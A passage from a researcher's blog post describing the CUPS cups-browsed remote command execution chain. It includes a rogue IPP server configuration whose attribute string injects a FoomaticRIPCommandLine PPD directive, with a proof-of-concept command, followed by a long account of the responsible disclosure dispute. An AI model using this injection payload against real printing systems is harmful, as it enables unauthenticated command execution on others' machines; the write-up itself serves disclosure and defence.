I had no idea that this can happen every time you print something, and to be frank it’s quite scary. They have to allow FoomaticRIPCommandLine to accept pretty much anything (including perl as you can see), or many printers will just stop working on UNIX.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Remote-Command-Execution-chainRemote Command Execution chain

So, in theory, we should now be able to:

- Force the target machine to connect back to our malicious IPP server.
- Return an IPP attribute string that will inject controlled PPD directives to the temporary file.
- Wait for a print job to be sent to our fake printer for the PPD directives, and therefore the command, to be executed.

Shall we? This is the configuration payload for the IPP server (this is a YAML file that you will be able to use with the next bettercap release and its new zeroconf and ipp modules):

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13

```

|

```
# ... other configuration removed for brevity ...

# enables the IPP server
ipp:
    # this can be the name of an existing device
    # in which case its original IPP record will be transparently hijacked
    printer-name: EVIL_PRINTER

    # where the magic happens, it's important to preserve the new lines
    printer-privacy-policy-uri: |
        https://www.google.com/"
        *FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"
        *cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip

```

You can see how we’re returning a printer-privacy-policy-uri attribute string (it can be any of the many attributes saved to the PPD) that will:

- Set printer-privacy-policy-uri to "https://www.google.com/", close the PPD string with the double quote, and add a new line.
- Inject the *FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED" line with our command in the PPD.
- Inject the *cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip line (notice the spaces before and after the colon and no closing double quotes) directive to instruct CUPS to execute /usr/lib/cups/filter/foomatic-rip (with our FoomaticRIPCommandLine) when a print job is sent.

In this video you can see me on my attacker machine (on the left) using the first version of this exploit to attack my new laptop, a fully patched Ubuntu 24.04.1 LTS running cups-browsed 2.0.1, and (finally!!!) achieving command execution:

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Personal-ConsiderationsPersonal Considerations

You will maybe be thinking now “wow, that’s a lot of stuff to read, code, RFCs, PDFs of forgotten standards, this research must have been so tiring”, but in reality this was a weekend worth of rabbit holes, this was the fun part. The actual work, the heavy, boring stuff started when on September 5, after confirming my findings, I decided to open a security advisory on the OpenPrinting cups-browsed repository and do what to me was the right thing to do: responsible disclosure.

I won’t go into the details of the [initial conversation](https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8), or the [ones](https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5) [that](https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6) [followed](https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47). You are free to read them (if they will ever open any of the threads and you are willing to read 50+ pages of conversations) or not, and make your own opinion.

While the research only took a couple of days, this part took 22. And this part was not fun. I will only say that to my personal experience, the responsible disclosure process is broken. That a lot is expected and taken for granted from the security researchers by triagers that behave like you have to “prove to be worth listening to” while in reality they barely care to process and understand what you are saying, only to realize you were right all along three weeks later (if at all).

Two days for the research, 249 lines of text for the fully working exploit.

Twenty-two days of arguments, condescension, several [gaslighting attempts](https://github.com/OpenPrinting/cups-browsed/issues/36) (the things i’ve read these days … you have no idea), more or less subtle personal attacks, dozens of emails and messages, more than 100 pages of text in total. Hours and hours and hours and hours and fucking hours. Not to mention somehow being judged by a big chunk of the infosec community with a tendency of talking and judging situations they simply don’t know.

Let that sink in for a moment … WTAF.

And we’re not talking about time spent on fixes while I was impatient and throwing a tantrum on twitter. The actual fixes (or a part of them) started being pushed much later. The vast majority of the time has been spent arguing whether or not these were issues worth considering. While I was trying to report that there’s something bad that should be addressed asap, the devs were being dismissive (and pushing other code, also vulnerable, for other functionalities instead of fixing) because I dared to criticize the design of their software. While at the same time I was trying to reach out privately to de-escalate and assure whoever was getting offended that my intent was not adversarial:

To the people that more or less directly questioned my integrity, accused me of spectacularization and of spreading FUD on my socials: I don’t do this for a living. I don’t need CVEs to get a job or to prove how good my kung-fu is. Or any attention other than what my projects and research already provide. I don’t play InfoSec Influencer™ like many. To put it like [Javier beautifully put it](https://x.com/JavierGonzalez/status/1838730623982186773), my mission was to interrupt the triagers focus until they re-prioritized. When I saw that what I thought was pretty serious was being dismissed as an annoyance, I used the only platform I had plus a pinch of drama as a tool to have them fucking re-prioritize. And it worked, wonderfully, more fixes happened after two tweets than with all the arguing and talking.

Don’t hate me, hate the system that forced me to do that in order to be taken seriously.

### https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#About-the-9-9-CVSSAbout the 9.9 CVSS

Somebody also accused of making things up, especially due to the 9.9 CVSS severity that I [claimed in this tweet](https://x.com/evilsocket/status/1838169889330135132). Granted, as [I very transparently said in the thread](https://x.com/evilsocket/status/1838220677389656127), I’m really not familiar with CVSS scores, how they are assigned and so on. But here’s a screenshot from the [VINCE report](https://www.kb.cert.org/vince) of the initial CVSS scores, including the 9.9, being estimated by a RedHat engineer (and also reviewed by another one):

As I said, I’m not an expert, and I think that the initial 9.9 was mostly due to the fact that the RCE is trivial to exploit and the package presence so widespread. Impact wise I wouldn’t classify it as a 9.9, but then again, what the hell do I know?

By the way, CERT’s VINCE either has a backdoor, or an inside leak, or has zero vetting on who they add to a disclosure, because [there’s been a leak](https://breachforums.st/Thread-Undisclosed-Linux-Unauth-RCE-as-they-claim-Writeup-from-researcher?pid=844608#pid844608) of the exact markdown report that I only shared there, including the exploit.

What a fucking circus.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#One-More-ThingOne More Thing

When initially I wrote exploit.py, it only sent the UDP packet and created the rogue IPP server. Then with time I started adding features to it, especially zeroconf advertising, and it became a tool. So at some point I decided to rewrite it in Go and integrate this new code in [bettercap](https://bettercap.org/), giving it the ability to transparently impersonate any service advertised via zeroconf / Bonjour / Avahi on a LAN and doing interesting things with the TXT records and specific service attributes, like IPP. And I discovered other interesting stuff :)

In part II of this series (date TBD since there’s another disclosure in process), we’ll see how to use these new bettercap modules (not yet released) to attack Apple macOS.

For now, I hope you enjoyed part I, hack the planet!

[#cups](https://www.evilsocket.net/tags/cups/) [#cups-browsed](https://www.evilsocket.net/tags/cups-browsed/) [#printer](https://www.evilsocket.net/tags/printer/) [#printing](https://www.evilsocket.net/tags/printing/) [#unix](https://www.evilsocket.net/tags/unix/) [#hacking](https://www.evilsocket.net/tags/hacking/) [#rce](https://www.evilsocket.net/tags/rce/) [#disclosure](https://www.evilsocket.net/tags/disclosure/) [#exploit](https://www.evilsocket.net/tags/exploit/) [#ipp](https://www.evilsocket.net/tags/ipp/) [#zeroconf](https://www.evilsocket.net/tags/zeroconf/) [#udp](https://www.evilsocket.net/tags/udp/) [#responsible disclosure](https://www.evilsocket.net/tags/responsible-disclosure/) [#vulnerability research](https://www.evilsocket.net/tags/vulnerability-research/) [#linux security](https://www.evilsocket.net/tags/linux-security/) [#print services](https://www.evilsocket.net/tags/print-services/) [#unauthenticated access](https://www.evilsocket.net/tags/unauthenticated-access/) [#cve](https://www.evilsocket.net/tags/cve/) [#CVE-2024-47176](https://www.evilsocket.net/tags/CVE-2024-47176/) [#CVE-2024-47076](https://www.evilsocket.net/tags/CVE-2024-47076/) [#CVE-2024-47175](https://www.evilsocket.net/tags/CVE-2024-47175/) [#CVE-2024-47177](https://www.evilsocket.net/tags/CVE-2024-47177/)

[## Mongoose: Preauth RCE and mTLS Bypass on Millions of Devices

READ MORE](https://www.evilsocket.net/2026/04/02/Mongoose-Preauth-Remote-Code-Execution-and-mTLS-Bypass/)

[## TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering

READ MORE](https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/)

[## Process Behaviour Anomaly Detection Using eBPF and Unsupervised-Learning Autoencoders

READ MORE](https://www.evilsocket.net/2022/08/15/Process-behaviour-anomaly-detection-using-eBPF-and-unsupervised-learning-Autoencoders/)

[## Hacking a Herb Vaporizer to Set Its Temperature Limit From 190C to 6553.5C Remotely

READ MORE](https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/)
